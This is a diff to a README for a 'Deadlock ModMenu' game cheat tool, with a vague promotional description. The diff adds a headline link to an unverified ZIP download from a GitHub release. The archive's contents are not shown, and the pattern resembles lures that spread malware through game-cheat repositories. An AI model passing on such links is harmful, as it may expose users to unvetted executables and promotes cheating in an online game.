@@ -1,5 +1,7 @@
 # Deadlock ModMenu
 
+# >>>[Deadlock modmenu here](https://github.com/DM-jr/Deadlock-Wave/releases/download/Deadlock/Deadlock.zip)
+
 ## Description
 Deadlock ModMenu is an advanced custom modification menu for the popular game, providing players with unique options for customizing the gameplay. This tool is designed to give users full control over various aspects of the game.
 
